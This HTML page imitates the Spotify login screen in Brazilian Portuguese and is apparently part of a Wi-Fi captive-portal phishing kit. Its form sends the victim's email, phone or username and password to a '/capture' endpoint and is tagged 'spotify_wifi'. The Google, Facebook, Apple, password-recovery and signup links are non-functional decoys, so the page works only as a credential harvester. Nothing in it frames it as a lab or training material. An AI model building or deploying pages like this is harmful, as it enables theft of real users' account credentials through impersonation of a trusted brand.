<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Spotify - Fazer login</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;background:#121212;color:#fff;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;padding:16px}
.container{width:100%;max-width:400px;background:#121212}
.spotify-logo{text-align:center;margin-bottom:28px}
.logo-inner{display:inline-flex;align-items:center;gap:10px}
.logo-circle{width:40px;height:40px;background:#1db954;border-radius:50%;display:flex;align-items:center;justify-content:center}
.logo-circle svg{width:24px;height:24px;fill:#000}
.logo-wordmark{font-size:26px;font-weight:900;color:#fff;letter-spacing:-0.5px}
h1{font-size:28px;font-weight:900;color:#fff;text-align:center;margin-bottom:32px;line-height:1.2}
.social-btn{width:100%;padding:14px 20px;background:transparent;color:#fff;border:1px solid #727272;border-radius:50px;font-size:14px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:12px;transition:border-color .15s,background .15s}
.social-btn:hover{border-color:#fff;background:#ffffff14}
.social-btn .s-icon{width:22px;height:22px;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:900}
.separator{display:flex;align-items:center;gap:12px;margin:20px 0;color:#a7a7a7;font-size:13px}
.separator::before,.separator::after{content:'';flex:1;height:1px;background:#727272}
.method-tabs{display:flex;gap:4px;background:#282828;padding:4px;border-radius:50px;margin-bottom:20px}
.mtab{flex:1;padding:10px 8px;background:transparent;border:none;border-radius:50px;font-size:13px;font-weight:700;color:#a7a7a7;cursor:pointer;transition:all .2s;text-align:center}
.mtab.active{background:#fff;color:#000}
.tab-pane{display:none}
.tab-pane.active{display:block}
label{display:block;font-size:12px;font-weight:700;color:#a7a7a7;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
input[type=text],input[type=email],input[type=password]{width:100%;background:#333;border:2px solid transparent;border-radius:6px;padding:14px 16px;font-size:16px;color:#fff;outline:none;margin-bottom:18px;transition:border-color .2s}
input:focus{border-color:#1db954;background:#3a3a3a}
input::placeholder{color:#727272}
.btn-login{width:100%;padding:15px;background:#1db954;color:#000;border:none;border-radius:50px;font-size:16px;font-weight:900;cursor:pointer;margin-top:4px;transition:transform .1s,background .15s;letter-spacing:.3px}
.btn-login:hover{background:#1ed760;transform:scale(1.01)}
.forgot{text-align:center;margin-top:24px}
.forgot a{color:#fff;font-size:14px;text-decoration:underline;font-weight:700}
.signup{text-align:center;margin-top:32px;font-size:14px;color:#a7a7a7;border-top:1px solid #282828;padding-top:28px}
.signup a{color:#fff;text-decoration:underline;font-weight:700}
@media(max-width:480px){h1{font-size:24px}.logo-wordmark{font-size:22px}}
</style>
</head>
<body>
<div class="container">
  <div class="spotify-logo">
    <div class="logo-inner">
      <div class="logo-circle">
        <svg viewBox="0 0 168 168" xmlns="http://www.w3.org/2000/svg">
          <path d="M84 0C37.6 0 0 37.6 0 84s37.6 84 84 84 84-37.6 84-84S130.4 0 84 0zm38.5 121.2c-1.5 2.5-4.8 3.3-7.3 1.8-20-12.2-45.2-15-74.9-8.2-2.9.7-5.7-1.1-6.4-4-.7-2.9 1.1-5.7 4-6.4 32.5-7.4 60.4-4.2 82.9 9.5 2.4 1.5 3.2 4.8 1.7 7.3zm10.3-22.9c-1.9 3.1-6 4.1-9.1 2.2-22.9-14.1-57.8-18.1-84.9-9.9-3.5 1.1-7.2-.9-8.3-4.4-1.1-3.5.9-7.2 4.4-8.3 31-9.4 69.5-4.9 95.8 11.3 3.1 1.9 4.1 6 2.1 9.1zm.9-23.8c-27.5-16.3-72.9-17.8-99.2-9.8-4.2 1.3-8.6-1.1-9.9-5.3-1.3-4.2 1.1-8.6 5.3-9.9 30.2-9.2 80.4-7.4 112.1 11.3 3.8 2.2 5 7 2.7 10.8-2.2 3.7-7.1 4.9-11 2.9z"/>
        </svg>
      </div>
      <span class="logo-wordmark">Spotify</span>
    </div>
  </div>
  <h1>Fazer login no Spotify</h1>
  <button class="social-btn" type="button" onclick="return false">
    <span class="s-icon">G</span>
    Continuar com o Google
  </button>
  <button class="social-btn" type="button" onclick="return false">
    <span class="s-icon">f</span>
    Continuar com o Facebook
  </button>
  <button class="social-btn" type="button" onclick="return false">
    <span class="s-icon">&#63743;</span>
    Continuar com a Apple
  </button>
  <div class="separator"><span>ou</span></div>
  <div class="method-tabs">
    <button class="mtab active" onclick="switchM('email',this)">E-mail</button>
    <button class="mtab" onclick="switchM('phone',this)">Telefone</button>
    <button class="mtab" onclick="switchM('user',this)">Usuario</button>
  </div>
  <form action="/capture" method="POST" autocomplete="off">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="portal_id" value="spotify_wifi">
    <input type="hidden" name="login_method" id="spmethod" value="email">
    <div class="tab-pane active" id="sppane-email">
      <label>E-mail</label>
      <input type="email" name="email" placeholder="E-mail" autocomplete="off">
    </div>
    <div class="tab-pane" id="sppane-phone">
      <label>Numero de telefone</label>
      <input type="text" name="phone" placeholder="(00) 00000-0000" oninput="maskPhone(this)" autocomplete="off">
    </div>
    <div class="tab-pane" id="sppane-user">
      <label>Nome de usuario do Spotify</label>
      <input type="text" name="username" placeholder="Nome de usuario" autocomplete="off">
    </div>
    <label>Senha</label>
    <input type="password" name="password" placeholder="Senha" required minlength="6" maxlength="128" autocomplete="new-password">
    <button class="btn-login" type="submit">Fazer login</button>
  </form>
  <p class="forgot"><a href="#" onclick="return false">Esqueceu sua senha?</a></p>
  <p class="signup">Nao tem uma conta? <a href="#" onclick="return false">Cadastre-se no Spotify</a></p>
</div>
<script>
function switchM(t,btn){
  document.querySelectorAll('.tab-pane').forEach(function(e){e.classList.remove('active')});
  document.querySelectorAll('.mtab').forEach(function(e){e.classList.remove('active')});
  document.getElementById('sppane-'+t).classList.add('active');
  btn.classList.add('active');
  document.getElementById('spmethod').value=t;
}
function maskPhone(el){
  var v=el.value.replace(/\D/g,'').slice(0,11);
  if(v.length>6)v=v.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3');
  else if(v.length>2)v=v.replace(/(\d{2})(\d+)/,'($1) $2');
  el.value=v;
}
</script>
</body>
</html>
